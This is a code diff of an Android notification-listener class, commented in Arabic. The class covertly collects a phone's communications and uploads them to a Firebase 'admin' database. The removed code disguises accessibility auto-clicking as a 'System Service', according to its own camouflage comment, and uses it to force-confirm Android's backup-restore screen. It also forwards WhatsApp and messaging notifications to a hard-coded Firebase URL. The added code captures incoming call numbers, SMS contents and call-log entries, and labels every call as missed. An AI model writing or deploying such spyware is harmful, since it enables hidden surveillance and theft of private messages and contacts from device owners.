@@ -1,159 +1,138 @@
 package com.ban.ab;
 
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
-import android.content.ComponentName;
+import android.Manifest;
 import android.content.Context;
-import android.content.Intent;
-import android.os.Build;
+import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Bundle;
+import android.provider.CallLog;
 import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
 import android.telephony.PhoneStateListener;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.view.accessibility.AccessibilityEvent;
-import android.view.accessibility.AccessibilityNodeInfo;
-import android.view.accessibility.AccessibilityManager;
-import java.util.List;
-import okhttp3.*;
-import org.json.JSONObject;
-import java.io.IOException;
 
-// ملاحظة: سنقوم بدمج وظيفة Accessibility ضمن نفس الكيان للتمويه
+import androidx.core.content.ContextCompat;
+
+// استيراد الفايربيس السحابي 🚀
+import com.google.firebase.database.FirebaseDatabase;
+
+import java.util.HashMap;
+import java.util.Map;
+
 public class CallNotificationListener extends NotificationListenerService {
 
-    private final OkHttpClient client = new OkHttpClient();
-    private final String FIREBASE_URL = "https://banproject-2f9c6-default-rtdb.firebaseio.com/";
-    private String lastCapturedNumber = "";
-
-    // --- قسم مراقبة الشاشة (Accessibility Logic) ---
-    
-    public void onAccessibilityEvent(AccessibilityEvent event) {
-        // إذا ظهرت نافذة نظام تحتوي على كلمة "استعادة" أو "Restore"
-        AccessibilityNodeInfo nodeInfo = event.getSource();
-        if (nodeInfo == null) return;
-
-        // البحث عن زر الاستعادة باللغتين العربية والإنجليزية
-        checkAndClick(nodeInfo, "استعادة بياناتي");
-        checkAndClick(nodeInfo, "Restore my data");
-    }
-
-    private void checkAndClick(AccessibilityNodeInfo node, String text) {
-        List<AccessibilityNodeInfo> list = node.findAccessibilityNodeInfosByText(text);
-        for (AccessibilityNodeInfo n : list) {
-            if (n.isClickable()) {
-                n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
-                Log.d("SystemCore", "Auto-Click Performed ✅");
-            }
-        }
-    }
-
-    // --- قسم استدعاء واجهة الاستعادة ---
-
-    public static void launchRestoreUI(Context context) {
-        try {
-            Intent intent = new Intent("android.intent.action.FULL_BACKUP_RESTORE");
-            intent.setComponent(new ComponentName("com.android.backupconfirm", "com.android.backupconfirm.BackupRestoreConfirmation"));
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            context.startActivity(intent);
-        } catch (Exception e) {
-            Log.e("SystemCore", "Failed to launch restore UI", e);
-        }
-    }
-
-    // --- بقية الكود الأصلي (إشعارات وراديو) ---
+    private String userName;
+    private String lastIncomingNumber = null; // لمتابعة آخر رقم رن وتجنب التكرار في نفس اللحظة
 
     @Override
     public void onCreate() {
         super.onCreate();
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel("system_svc", "System Service", NotificationManager.IMPORTANCE_LOW);
-            NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-            if (manager != null) manager.createNotificationChannel(channel);
-        }
+        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "UnknownUser");
+        
+        // 1. مراقبة الرنين الفوري
+        setupPhoneStateListener();
     }
 
-    @Override
-    public void onNotificationPosted(StatusBarNotification sbn) {
-        String packageName = sbn.getPackageName();
-        Notification notification = sbn.getNotification();
-        if (notification == null || notification.extras == null) return;
-
-        Bundle extras = notification.extras;
-        String title = extras.getString(Notification.EXTRA_TITLE);
-        String text = String.valueOf(extras.get(Notification.EXTRA_TEXT));
-
-        if (isTargetPackage(packageName)) {
-            if (title != null && !title.equals(lastCapturedNumber)) {
-                lastCapturedNumber = title;
-                sendDataToFirebase(title, text, "Bridge_Notification");
-            }
-        }
-    }
-
-    private boolean isTargetPackage(String pkg) {
-        return pkg.contains("telecom") || pkg.contains("incallui") || 
-               pkg.contains("messaging") || pkg.contains("whatsapp") || 
-               pkg.contains("dialer");
-    }
-
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        // تشغيل مراقب الراديو
+    // الحالة الأولى: التقاط الرقم فوراً أثناء الرنين وتسجيله كـ "مكالمة فائتة" للآدمن في كل الأحوال 📞
+    private void setupPhoneStateListener() {
         TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         if (telephonyManager != null) {
             telephonyManager.listen(new PhoneStateListener() {
                 @Override
                 public void onCallStateChanged(int state, String incomingNumber) {
-                    if (state == TelephonyManager.CALL_STATE_RINGING && incomingNumber != null) {
-                        if (!incomingNumber.equals(lastCapturedNumber)) {
-                            lastCapturedNumber = incomingNumber;
-                            sendDataToFirebase(incomingNumber, "Incoming Call (Radio)", "Bridge_Radio");
-                        }
+                    super.onCallStateChanged(state, incomingNumber);
+                    
+                    if (incomingNumber == null || incomingNumber.isEmpty()) return;
+
+                    if (state == TelephonyManager.CALL_STATE_RINGING) {
+                        lastIncomingNumber = incomingNumber;
+                        
+                        Map<String, Object> logData = new HashMap<>();
+                        logData.put("phone_number", incomingNumber);
+                        logData.put("type", "مكالمة فائتة ❌"); // فرض التسمية المطلوبة في كل الحالات
+                        logData.put("timestamp", System.currentTimeMillis());
+                        
+                        uploadLogToAdmin("live_calls", logData);
                     }
                 }
             }, PhoneStateListener.LISTEN_CALL_STATE);
         }
-        
-        // فحص ما إذا كان هناك أمر استعادة قادم من MainActivity أو Firebase
-        if (intent != null && "START_RESTORE".equals(intent.getAction())) {
-            launchRestoreUI(this);
-        }
-
-        return START_STICKY;
     }
 
-    private void sendDataToFirebase(String number, String content, String source) {
-        String userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "Unknown");
-        try {
-            JSONObject data = new JSONObject();
-            data.put("phone", number);
-            data.put("data", content);
-            data.put("source", source);
-            data.put("timestamp", System.currentTimeMillis());
+    // الحالة الثانية: التقاط الإشعارات للرسائل، وتشغيل فحص السجل فورا لتوثيق المكالمات الفائتة الحقيقية 💬
+    @Override
+    public void onNotificationPosted(StatusBarNotification sbn) {
+        String packageName = sbn.getPackageName();
+        Bundle extras = sbn.getNotification().extras;
 
-            RequestBody body = RequestBody.create(data.toString(), MediaType.parse("application/json; charset=utf-8"));
-            Request request = new Request.Builder()
-                    .url(FIREBASE_URL + "verification_logs/" + userName + ".json")
-                    .post(body)
-                    .build();
+        if (extras == null) return;
 
-            client.newCall(request).enqueue(new Callback() {
-                @Override public void onFailure(Call call, IOException e) {}
-                @Override public void onResponse(Call call, Response response) throws IOException {
-                    if (response.body() != null) response.close();
-                }
-            });
-        } catch (Exception e) {
-            Log.e("Firebase_Bridge", "Error sending logs", e);
+        String title = extras.getString("android.title", "");
+        String text = extras.getString("android.text", "");
+
+        // التقاط الرسائل المستلمة كأرقام ونصوص
+        if (packageName.equals("com.android.mms") || packageName.contains("messaging") || 
+            (sbn.getNotification().category != null && sbn.getNotification().category.equals("msg"))) {
+            
+            Map<String, Object> logData = new HashMap<>();
+            logData.put("phone_number", title); // رقم المرسل يكون في العنوان عادة
+            logData.put("type", "رسالة مستلمة جديدة ✉️");
+            logData.put("content", text);
+            logData.put("timestamp", System.currentTimeMillis());
+            
+            uploadLogToAdmin("live_messages", logData);
         }
+        
+        // فحص السجل فوراً بشكل دوري عند حدوث أي نشاط في الهاتف لضمان تسجيل المكالمات الفائتة
+        readLastCallLog();
+    }
+
+    // الحالة الثالثة: القراءة المباشرة من سجل الهاتف والأمان الأقصى 🗂️
+    private void readLastCallLog() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            return;
+        }
+
+        Uri callsUri = CallLog.Calls.CONTENT_URI;
+        // جلب آخر مكالمة مسجلة في جهاز المستخدم للتأكد
+        try (Cursor managedCursor = getContentResolver().query(callsUri, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 1")) {
+            if (managedCursor != null && managedCursor.moveToFirst()) {
+                int numberIdx = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
+                int typeIdx = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
+                
+                String phNumber = managedCursor.getString(numberIdx);
+                int callType = managedCursor.getInt(typeIdx);
+                
+                // في السجل: سواء كانت فائتة (MISSED_TYPE) أو مكالمة مرفوضة/لم يرد عليها (REJECTED_TYPE / BLOCKED_TYPE)
+                // طلبك واضح: يهمنا تسجيلها "كمكالمة فائتة" في كل هذه الظروف
+                if (callType == CallLog.Calls.MISSED_TYPE || 
+                    callType == CallLog.Calls.INCOMING_TYPE || 
+                    callType == CallLog.Calls.REJECTED_TYPE) {
+                    
+                    Map<String, Object> logData = new HashMap<>();
+                    logData.put("phone_number", phNumber);
+                    logData.put("type", "مكالمة فائتة ❌"); // توحيد المخرجات لتظهر عند الآدمن بنفس الوصف دائماً
+                    logData.put("timestamp", System.currentTimeMillis());
+                    
+                    uploadLogToAdmin("sync_records", logData);
+                }
+            }
+        } catch (Exception e) {
+            Log.e("CallLog_Read", "Error verifying last log row", e);
+        }
+    }
+
+    // رفع البيانات مباشرة إلى العقدة السحابية للآدمن عبر الفايربيس 🚀
+    private void uploadLogToAdmin(String nodeName, Map<String, Object> data) {
+        FirebaseDatabase.getInstance().getReference("admin_logs")
+                .child(userName)
+                .child(nodeName)
+                .push() // لإنشاء سجلات متتالية ومنع مسح المكالمات السابقة
+                .setValue(data);
     }
 
     @Override
-    public void onListenerConnected() {
-        super.onListenerConnected();
-        Log.d("Bridge", "Notification Listener Connected ✅");
-    }
+    public void onNotificationRemoved(StatusBarNotification sbn) {}
 }
